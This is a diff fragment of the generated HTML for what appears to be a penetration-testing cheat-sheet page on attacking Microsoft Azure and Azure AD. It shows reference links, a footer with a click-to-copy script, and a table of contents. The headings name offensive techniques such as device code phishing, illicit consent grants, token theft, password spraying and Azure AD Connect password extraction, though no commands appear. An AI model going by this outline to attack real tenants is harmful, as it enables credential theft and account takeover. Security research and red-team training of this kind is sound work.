+  <a href="https://dirkjanm.io/introducing-roadtools-and-roadrecon-azure-ad-exploration-framework/">Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema</a></li>
+<li>
+  <a href="https://medium.com/@talthemaor/moving-laterally-between-azure-ad-joined-machines-ed1f8871da56">Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020</a></li>
+<li>
+  <a href="https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html">AZURE AD INTRODUCTION FOR RED TEAMERS - Written by Aymeric Palhière (bak) - 2020-04-20</a></li>
+<li>
+  <a href="https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/">Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter</a></li>
+<li>
+  <a href="https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html">The Art of the Device Code Phish - Bobby Cooke</a></li>
+<li>
+  <a href="https://hideandsec.sh/books/cheatsheets-82c/page/azure-ad">AZURE AD cheatsheet - BlackWasp</a></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/edit/main/exampleSite/content.en/docs/microsoft_azure_cloud.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#cloud---azure">Cloud - Azure</a>
+      <ul>
+        <li><a href="#azure-recon-tools">Azure Recon Tools</a></li>
+        <li><a href="#terminology">Terminology</a></li>
+        <li><a href="#enumeration">Enumeration</a>
+          <ul>
+            <li><a href="#enumerate-valid-emails">Enumerate valid emails</a></li>
+            <li><a href="#enumerate-azure-subdomains">Enumerate Azure Subdomains</a></li>
+            <li><a href="#enumerate-tenant-with-azure-ad-powershell">Enumerate tenant with Azure AD Powershell</a></li>
+            <li><a href="#enumerate-tenant-with-az-powershell">Enumerate tenant with Az Powershell</a></li>
+            <li><a href="#enumerate-tenant-with-az-cli">Enumerate tenant with az cli</a></li>
+            <li><a href="#enumerate-manually">Enumerate manually</a></li>
+          </ul>
+        </li>
+        <li><a href="#enumeration-methodology">Enumeration methodology</a></li>
+        <li><a href="#phishing-with-evilginx2">Phishing with Evilginx2</a></li>
+        <li><a href="#illicit-consent-grant">Illicit Consent Grant</a>
+          <ul>
+            <li><a href="#register-application">Register Application</a></li>
+            <li><a href="#configure-application">Configure Application</a></li>
+            <li><a href="#setup-365-stealer-deprecated">Setup 365-Stealer (Deprecated)</a></li>
+            <li><a href="#setup-vajra">Setup Vajra</a></li>
+          </ul>
+        </li>
+        <li><a href="#device-code-phish">Device Code Phish</a></li>
+        <li><a href="#token-from-managed-identity">Token from Managed Identity</a>
+          <ul>
+            <li><a href="#azure-api-via-powershell">Azure API via Powershell</a></li>
+            <li><a href="#azure-api-via-python-version">Azure API via Python Version</a></li>
+            <li><a href="#get-tokens">Get Tokens</a></li>
+            <li><a href="#use-tokens">Use Tokens</a></li>
+            <li><a href="#refresh-tokens">Refresh Tokens</a></li>
+          </ul>
+        </li>
+        <li><a href="#stealing-tokens">Stealing Tokens</a>
+          <ul>
+            <li><a href="#stealing-tokens-from-az-cli">Stealing tokens from az cli</a></li>
+            <li><a href="#stealing-tokens-from-az-powershell">Stealing tokens from az powershell</a></li>
+          </ul>
+        </li>
+        <li><a href="#add-credentials-to-all-enterprise-applications">Add credentials to all Enterprise Applications</a></li>
+        <li><a href="#spawn-ssh-for-azure-web-app">Spawn SSH for Azure Web App</a></li>
+        <li><a href="#azure-storage-blob">Azure Storage Blob</a>
+          <ul>
+            <li><a href="#enumerate-blobs">Enumerate blobs</a></li>
+            <li><a href="#sas-url">SAS URL</a></li>
+            <li><a href="#list-and-download-blobs">List and download blobs</a></li>
+          </ul>
+        </li>
+        <li><a href="#runbook-automation">Runbook Automation</a>
+          <ul>
+            <li><a href="#create-a-runbook">Create a Runbook</a></li>
+            <li><a href="#persistence-via-automation-accounts">Persistence via Automation accounts</a></li>
+          </ul>
+        </li>
+        <li><a href="#virtual-machine-runcommand">Virtual Machine RunCommand</a></li>
+        <li><a href="#keyvault-secrets">KeyVault Secrets</a></li>
+        <li><a href="#pass-the-prt">Pass The PRT</a></li>
+        <li><a href="#pass-the-certificate">Pass The Certificate</a></li>
+        <li><a href="#intunes-administration">Intunes Administration</a></li>
+        <li><a href="#dynamic-group-membership">Dynamic Group Membership</a></li>
+        <li><a href="#administrative-unit">Administrative Unit</a></li>
+        <li><a href="#deployment-template">Deployment Template</a></li>
+        <li><a href="#application-proxy">Application Proxy</a></li>
+        <li><a href="#conditional-access">Conditional Access</a></li>
+        <li><a href="#azure-ad">Azure AD</a>
+          <ul>
+            <li><a href="#azure-ad-vs-active-directory">Azure AD vs Active Directory</a></li>
+            <li><a href="#password-spray">Password Spray</a></li>
+            <li><a href="#convert-guid-to-sid">Convert GUID to SID</a></li>
+          </ul>
+        </li>
+        <li><a href="#azure-ad-connect">Azure AD Connect</a>
+          <ul>
+            <li><a href="#azure-ad-connect---password-extraction">Azure AD Connect - Password extraction</a></li>
+            <li><a href="#azure-ad-connect---msol-accounts-password-and-dcsync">Azure AD Connect - MSOL Account&rsquo;s password and DCSync</a></li>
+            <li><a href="#azure-ad-connect---seamless-single-sign-on-silver-ticket">Azure AD Connect - Seamless Single Sign On Silver Ticket</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
